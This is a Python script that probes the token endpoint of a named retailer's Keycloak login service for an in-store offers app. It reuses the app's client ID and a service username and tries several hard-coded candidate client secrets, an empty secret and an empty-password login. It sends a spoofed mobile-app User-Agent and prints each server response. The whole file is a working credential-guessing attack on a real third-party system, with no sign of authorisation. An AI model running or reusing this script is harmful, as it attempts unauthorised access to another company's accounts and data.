"""Probe the in-store offers Keycloak token endpoint."""
import json
import urllib.error
import urllib.parse
import urllib.request

TOKEN_URL = "https://freyr.portal.atacadao.com.br/infosec/auth/v1/protocol/openid-connect/token"
CLIENT_ID = "OfertaMobile-TokenAuth"
USERNAME = "kcc-ofertas-externo"

CANDIDATE_SECRETS = [
    "",
    "4d011940-6b12-4b7c-92f2-37a547f2c706",
    "98a43734-4089-48b6-a1af-d8d02317766a",
    "b6b4b1b3-b79d-4665-9bcb-a00e479818f6",
    "fba05132-0f37-4cdc-ba4d-6c40db875b84",
]


def post(form: dict) -> tuple[int, str, dict]:
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(TOKEN_URL, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "okhttp/4.12.0")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode(errors="replace"), dict(resp.headers)
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        return exc.code, body, dict(exc.headers)


# 1) client_credentials with no secret -> read error body
status, body, headers = post({"grant_type": "client_credentials", "client_id": CLIENT_ID})
print("client_credentials (no secret):", status)
print("  www-authenticate:", headers.get("WWW-Authenticate"))
print("  body:", body[:500])

# 2) try candidate secrets
for secret in CANDIDATE_SECRETS:
    if not secret:
        continue
    status, body, _ = post({
        "grant_type": "client_credentials",
        "client_id": CLIENT_ID,
        "client_secret": secret,
    })
    print(f"client_credentials secret={secret[:12]}... -> {status} {body[:200]}")

# 3) password grant with username and no secret
status, body, _ = post({
    "grant_type": "password",
    "client_id": CLIENT_ID,
    "username": USERNAME,
    "password": "",
})
print("password (no pw):", status, body[:300])
